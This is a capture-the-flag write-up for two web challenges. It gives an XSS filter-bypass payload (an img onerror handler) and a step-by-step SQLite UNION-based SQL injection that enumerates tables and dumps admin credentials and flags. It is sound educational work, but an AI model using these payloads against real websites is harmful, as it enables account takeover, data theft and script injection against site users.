# 1. Choosy
Description:
Single solution doesn't works on all problems. One should try different solutions for different problem.

link: http://20.193.247.209:8333/

Solution:
+ XSS detected
+ ` <image src/onerror=alert(1)>` this input gives xss
+ <script> tag is blacklisted
+ final payload:`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
+ Flag: shellctf{50oom3_P4yL0aDS_aM0ng_Maaa4nnY}

  
# 2. Extractor
  
  Description: We are under emergency. Enemy is ready with its nuclear weapon we need to activate our gaurds but chief who had password is dead. There is portal at URL below which holds key within super-user account, can you get the key and save us.
  link: http://20.125.142.38:8956/

  Solution:
  + An sql injection challenge
  + we are provided with login and register functionality.
  + When we simply inserted `' or 1=1 --+` we got the following informations dumped.
   name: user
   password: pass123
  signature: nothing here
  
 + From this we can understand that its a basic sql injection challenge.
 + So, now lets try to know how many columns are there in the database
   query: `' union select 1,2,3,4 --+`
   output: name:2
           pass: 3
          signature: 4
+ Dump the sqlite version:
  query:` ' union select 1,sqlite_version(),3,4 --+`
  outptu: name: 3.27.2
          pass:3
          signature: 4
  
 + Now we need to get the table names:
   query: `' union select 1,group_concat(tbl_name),3,4 from sqlite_master where type='table' and tbl_name NOT LIKE 'sqlite_%' --+`
   output: name: Admin, users
            pass:3
            signature: 4
  
 + Column names of the table 'Admin':
  query: `' union select 1,sql,3,4 from sqlite_master where type!='meta' and sql NOT NULL and name not like 'sqlite_%' --+`
  output: name:CREATE TABLE Admins ( id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT NOT NULL, pass TEXT NOT NULL, content TEXT NOT NULL )
          pass: 3
          signature: 4
  
 +Now the values of the given columns: (user, pass,content)
  query: `' union select 1, user,pass,content from Admins --+`
  outptu: name: admin
          pass: h4rd_to_gu355
          signature: shellctf{Sql_1Nj3c7i0n_B45iC_XD}
  
 + So, here we got the flag!
  
  

  

